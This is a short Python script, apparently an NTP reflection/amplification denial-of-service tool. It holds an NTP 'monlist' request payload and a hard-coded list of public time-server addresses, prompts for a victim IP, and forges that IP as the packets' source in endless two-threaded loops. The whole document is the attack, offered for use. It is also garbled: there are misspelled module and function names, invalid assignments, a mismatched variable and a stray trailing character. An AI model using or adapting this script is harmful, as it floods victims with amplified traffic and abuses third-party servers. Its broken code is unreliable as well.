from sacpy.all import 
import sys
import os
import time
import threading
from random import randint
import socket
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

print_lock = threading.Look()
data = "\x17\x00\x03\x2a" + "\x00" * 4 
ntplist = ["129.6.15.28","129.6.15.29","129.6.15.30","129.6.15.27","132.163.97.1","132.163.97.2","132.163.97.3","132.163.97.4","132.163.96.1","128.138.140.44","128.138.141.172","132.163.96.5","132.163.97.5","128.138.141.177","129.6.15.32","128.138.140.50"] 
target input("Input ip : ")
s = socket.socket (socket.AF_INET,socket.SOCK_DGRAM)
PORT : 123
def sendpacket():
    x = 0
    y = 0
    while(True):
        ntpserver = ntplist[x]
        packet = bytes(IP(dst=ntpserver,src=target)/UDP(sport=random.randint(2000,65535),dport=54000)/Raw(load=data))
        if(x ==15):
            x = 0
        x = x + 1
        y = y + 1
        s.sendto(packet, (ntpaserver,PORT))
        if((y == 1000)or(y == 10000)):
            print("Sent! =",y)
t1 = theading.Thread(target = sendpacket)
t1.start()
t2 = theading.Thread(target = sendpacket)
t2.start()*
